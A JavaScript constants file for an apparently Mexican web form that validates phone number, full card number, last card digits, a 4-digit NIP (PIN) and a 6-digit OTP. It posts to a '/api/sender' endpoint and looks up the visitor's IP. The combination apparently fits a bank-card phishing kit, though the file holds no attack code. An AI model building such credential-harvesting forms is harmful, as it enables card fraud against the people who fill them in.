// Constants for the application

// Error messages
export const ERROR_MESSAGES = {
    PHONE_INVALID: 'Ingresa un número de teléfono válido de 10 dígitos.',
    BIRTHDATE_INVALID: 'Debes ser mayor de 18 años.',
    CARD_INVALID: 'Ingresa un número de tarjeta válido de 16 dígitos.',
    TERMS_NOT_ACCEPTED: 'Debes aceptar los términos y condiciones.',
    PRIVACY_NOT_ACCEPTED: 'Debes aceptar el aviso de privacidad.',
    LAST_TWO_DIGITS_INVALID: 'Ingresa los 2 últimos dígitos de tu tarjeta.',
    NIP_INVALID: 'Ingresa los 4 dígitos de tu NIP.',
    OTP_INVALID: 'Ingresa un código OTP válido de 6 dígitos.',
    SUBMISSION_ERROR: 'Hubo un problema en el envío de datos.',
    NETWORK_ERROR: 'Error al enviar los datos.',
};

// API endpoints
export const API_ENDPOINTS = {
    SENDER: '/api/sender',
    IP_SERVICE: 'https://api.ipify.org?format=json',
};

// Validation regex patterns
export const PATTERNS = {
    PHONE: /^[0-9]{10}$/,
    CARD: /^[0-9]{16}$/,
    NIP: /^[0-9]{4}$/,
    LAST_TWO_DIGITS: /^[0-9]{2}$/,
    OTP: /^[0-9]{6}$/,
};

// Input constraints
export const INPUT_CONSTRAINTS = {
    PHONE_MAX_LENGTH: 10,
    CARD_MAX_LENGTH: 16,
    NIP_MAX_LENGTH: 4,
    LAST_TWO_DIGITS_MAX_LENGTH: 2,
    OTP_MAX_LENGTH: 6,
};

// Timing constants (in milliseconds)
export const TIMING = {
    REDIRECT_DELAY: 2000,
    SNACKBAR_AUTO_HIDE: 6000,
};

// Invalid characters for numeric inputs
export const INVALID_NUMERIC_CHARS = ['e', 'E', '+', '-', '.'];
